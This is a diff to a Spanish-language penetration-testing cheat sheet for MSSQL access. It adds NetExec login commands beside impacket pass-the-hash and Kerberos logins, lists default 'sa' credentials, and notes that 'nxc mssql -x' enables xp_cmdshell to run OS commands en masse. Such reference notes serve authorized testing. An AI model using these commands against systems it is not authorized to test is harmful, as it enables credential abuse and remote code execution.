@@ -25,8 +25,13 @@ tags:
 | Pass-the-hash | `impacket-mssqlclient DOM/u@HOST -hashes :NT -windows-auth` |
 | Kerberos | `impacket-mssqlclient -k HOST` |
 | Cliente nativo Linux | `sqsh -S HOST -U u -P p` · `sqlcmd -S HOST -U u -P p` |
+| NetExec, auth de dominio | `nxc mssql HOST -u u -p p -d DOM` |
+| NetExec, dominio actual/local | `nxc mssql HOST -u u -p p -d .` |
+| NetExec, auth SQL local | `nxc mssql HOST -u u -p p --local-auth` |
 
 Credenciales por defecto que valen probar: `sa:(vacía)`, `sa:sa`, `sa:Password123`.
+
+`nxc mssql` no solo autentica: corre queries con `-q 'SELECT @@version'` y comandos del SO con `-x 'whoami'` (habilita `xp_cmdshell` por vos). Ideal para validar acceso y ejecutar en masa sin abrir sesión.
 
 ## Reconocimiento
 
